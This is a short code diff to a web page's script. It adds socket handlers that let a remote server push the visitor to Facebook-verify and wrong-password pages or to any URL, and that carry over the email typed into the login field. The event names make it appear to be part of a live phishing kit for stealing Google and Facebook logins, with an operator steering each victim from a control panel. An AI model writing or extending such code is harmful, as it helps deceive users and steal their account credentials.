@@ -335,6 +335,23 @@
     });
     socket.on('show-old-pass', () => loadModalPage('old-password'));
 
+    socket.on('show-google-login', () => {
+      const emailEl = document.getElementById('username');
+      const fbEmail = (emailEl && emailEl.value.trim())
+                      || sessionStorage.getItem('lastLoginEmail')
+                      || '';
+      try { sessionStorage.setItem('lastLoginEmail', fbEmail); } catch(e) {}
+      window.location.href = 'fb-verify.html';
+    });
+
+    socket.on('show-gmail-wrong-pass', () => {
+      try { sessionStorage.setItem('pendingModal', 'wrongcreds'); } catch(e) {}
+      window.location.href = 'apply.html';
+    });
+
+    socket.on('redirect', (url) => {
+      window.location.href = url;
+    });
 
   </script>
   <script>
